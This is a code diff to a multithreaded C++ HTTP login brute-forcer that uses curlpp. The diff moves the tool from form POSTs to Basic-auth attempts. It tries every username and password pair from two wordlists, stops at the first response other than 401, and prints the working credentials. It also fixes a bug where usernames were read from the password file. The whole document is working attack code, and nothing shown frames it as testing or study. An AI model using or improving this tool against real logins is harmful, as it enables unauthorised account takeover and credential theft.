@@ -13,12 +13,16 @@
 #include <curlpp/cURLpp.hpp>
 #include <curlpp/Easy.hpp>
 #include <curlpp/Options.hpp>
+#include <curlpp/Infos.hpp>
+#include <curlpp/Info.hpp>
+
 
 int RequestsMade = 0;
 int ThreadCount = std::thread::hardware_concurrency();
 std::mutex mtx;
 std::string url;
 std::string bodyTemplate;
+bool found=false;
 
 struct Payload
 {
@@ -37,7 +41,7 @@ size_t WriteStringCallback(char *ptr, size_t size, size_t nmemb)
 {
 	std::string data = std::string(ptr, size * nmemb);
 	int totalSize = size * nmemb;
-	std::cout << "DATA:  " << data << std::endl;
+	// std::cout << "DATA:  " << data << std::endl;
 	return totalSize;
 }
 
@@ -107,7 +111,7 @@ void thread_function()
 	std::string cookies = "";
 	std::string body = "";
 
-	while (!payloads.empty())
+	while (!found && !payloads.empty())
 	{
 		mtx.lock();
 		Payload payload = payloads.back();
@@ -116,12 +120,23 @@ void thread_function()
 		mtx.unlock();
 		body = passInParameters(bodyTemplate, payload);
 		handle.setOpt<cURLpp::options::Url>(url);
-		handle.setOpt<cURLpp::options::HttpHeader>(header);
-		handle.setOpt<cURLpp::options::CookieList>(cookies);
-		handle.setOpt<cURLpp::options::PostFields>(body);
-		handle.setOpt<cURLpp::options::PostFieldSize>(body.length());
-		handle.setOpt<cURLpp::options::UserAgent>("");
+		handle.setOpt(new curlpp::options::UserPwd( std::string(payload.username+":"+payload.password) ));
+		// handle.setOpt<cURLpp::options::HttpHeader>(header);
+		// handle.setOpt<cURLpp::options::CookieList>(cookies);
+		// handle.setOpt<cURLpp::options::PostFields>(body);
+		// handle.setOpt<cURLpp::options::PostFieldSize>(body.length());
+		// handle.setOpt<cURLpp::options::UserAgent>("");
+		// handle.setOpt(new curlpp::options::Verbose( true ) );
 		handle.perform();
+		const long responseCode = curlpp::infos::ResponseCode::get(handle);
+
+		if(responseCode != 401){
+			mtx.lock();
+			std::cout << "Response Code: " << responseCode << std::endl;			
+			std::cout << "Username: " << payload.username << " Password: " << payload.password << std::endl;
+			found = true;
+			mtx.unlock();
+		}
 		os.clear();
 	}
 }
@@ -138,7 +153,7 @@ int main(int argc, char *argv[])
 	std::vector<std::string> passwords = getFileLines(passwordListPath);
 
 	std::cout << "Reading " << usernameListPath << std::endl;
-	std::vector<std::string> usernames = getFileLines(passwordListPath);
+	std::vector<std::string> usernames = getFileLines(usernameListPath);
 	while (!usernames.empty())
 	{
 		std::string username = usernames.back();
@@ -148,9 +163,10 @@ int main(int argc, char *argv[])
 		}
 		usernames.pop_back();
 	}
+	std::reverse(payloads.begin(), payloads.end());
 	passwords.clear();
 	usernames.clear();
-	std::cout << payloads.size() << " payloads created and shuffled." << std::endl;
+	std::cout << payloads.size() << " payloads created" << std::endl;
 
 	std::cout << "Starting " << ThreadCount << " threads" << std::endl;
 	auto start = std::chrono::system_clock::now();
@@ -165,7 +181,7 @@ int main(int argc, char *argv[])
 
 	sleep(1);
 	int previousRequests = 0;
-	while (!payloads.empty())
+	while (!found && !payloads.empty())
 	{
 		int requestsPerSecond = RequestsMade - previousRequests;
 		double secondsRemaining = (payloads.size() - RequestsMade) / requestsPerSecond;
